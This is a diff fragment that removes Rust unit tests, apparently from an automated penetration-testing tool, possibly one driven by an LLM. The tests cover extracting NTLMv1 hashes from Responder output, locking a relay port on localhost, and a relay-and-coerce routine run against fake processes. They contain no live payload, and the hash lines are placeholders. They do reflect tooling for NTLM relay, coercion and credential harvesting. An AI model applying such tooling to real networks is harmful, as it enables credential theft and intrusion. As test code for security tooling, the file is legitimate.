-[SMB] NTLMv1-SSP Hash : USER1::DOMAIN:lmhash:nthash:challenge\n\
-[SMB] NTLMv1 Hash     : USER2::DOMAIN:lm:nt:chal\n";
-        let hashes = super::extract_responder_hashes(dump);
-        assert_eq!(hashes.len(), 2);
-        assert!(hashes[0].starts_with("USER1::"));
-        assert!(hashes[1].starts_with("USER2::"));
-    }
-
-    #[test]
-    fn extract_responder_hashes_returns_empty_when_no_capture_lines() {
-        let dump = "[*] Listening on eth0\n[*] Serving HTTP\n[*] No clients connected\n";
-        assert!(super::extract_responder_hashes(dump).is_empty());
-    }
-
-    #[tokio::test]
-    async fn acquire_relay_lock_waits_then_acquires_when_holder_releases() {
-        // Hold the sentinel briefly, then release. The wait-acquire path
-        // should poll, see the release, and return Some. This was the
-        // whole point of Option B — previously, the loser bailed
-        // immediately and the orchestrator burned a retry cycle.
-        let _serialize = SENTINEL_TEST_LOCK.lock().await;
-        super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
-        struct ResetFlag;
-        impl Drop for ResetFlag {
-            fn drop(&mut self) {
-                super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(false));
-            }
-        }
-        let _reset = ResetFlag;
-
-        let holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
-            .expect("bind sentinel");
-        // Release after 600ms; the acquire path polls every 500ms so the
-        // second iteration should land the bind.
-        tokio::spawn(async move {
-            tokio::time::sleep(std::time::Duration::from_millis(600)).await;
-            drop(holder);
-        });
-
-        let acquired = super::acquire_relay_lock(std::time::Duration::from_secs(3)).await;
-        assert!(
-            acquired.is_some(),
-            "expected acquire after holder released within 3s"
-        );
-    }
-
-    #[tokio::test]
-    async fn acquire_relay_lock_returns_none_after_timeout_when_held() {
-        // Holder never releases — wait-acquire should give up at the
-        // deadline and return None, producing the BIND_BUSY sentinel
-        // upstream rather than blocking forever.
-        let _serialize = SENTINEL_TEST_LOCK.lock().await;
-        super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
-        struct ResetFlag;
-        impl Drop for ResetFlag {
-            fn drop(&mut self) {
-                super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(false));
-            }
-        }
-        let _reset = ResetFlag;
-        let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
-            .expect("bind sentinel");
-
-        let acquired = super::acquire_relay_lock(std::time::Duration::from_millis(700)).await;
-        assert!(
-            acquired.is_none(),
-            "expected None after timeout while holder kept the lock"
-        );
-    }
-
-    #[tokio::test]
-    async fn relay_busy_message_quotes_wait_seconds_after_lock_timeout() {
-        // Composite path: when the wait elapses, the BIND_BUSY stdout
-        // must include the configured wait so operators / the LLM can
-        // tell "we waited and gave up" from the old "we bailed
-        // immediately" semantics.
-        let _serialize = SENTINEL_TEST_LOCK.lock().await;
-        super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
-        struct ResetFlag;
-        impl Drop for ResetFlag {
-            fn drop(&mut self) {
-                super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(false));
-            }
-        }
-        let _reset = ResetFlag;
-        let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
-            .expect("bind sentinel");
-
-        let mut opts = fast_opts();
-        opts.acquire_host_lock = true;
-        opts.relay_lock_wait = std::time::Duration::from_millis(400);
-        let fake = FakeCoerceProcs::new();
-        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, opts)
-            .await
-            .unwrap();
-        assert!(out.stdout.contains("RELAY_BIND_BUSY"));
-        assert!(
-            out.stdout.contains("did not release within 0s"),
-            "expected wait-seconds in BIND_BUSY message, got: {}",
-            out.stdout
-        );
     }
 }
